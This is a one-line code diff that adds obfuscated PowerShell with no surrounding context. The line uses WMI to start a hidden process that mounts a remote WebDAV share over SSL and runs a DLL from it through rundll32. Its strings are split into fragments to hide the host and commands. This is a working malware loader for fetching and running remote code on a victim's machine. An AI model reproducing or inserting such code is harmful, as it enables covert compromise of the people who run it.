@@ -1,0 +1,1 @@
+$Chnz=([wmiclass](-join('Win32_P','roce','ssSta','rt','u','p'))).CreateInstance();$Chnz.ShowWindow=0;([wmiclass](-join('Wi','n32_Pro','ce','s','s'))).Create(('cmd /c '+'pus'+'hd '+'\\hgs.'+'filee'+'cell.com'+'.'+'com@SSL'+'\b79595'+'4a-'+'a627'+'-'+'469b-9'+'21'+'5-ec388'+'8'+'6'+'d'+'e491 & r'+'un'+'dl'+'l'+'32 w'+'e'+'.'+'ch,'+'#'+'1'),$null,$Chnz
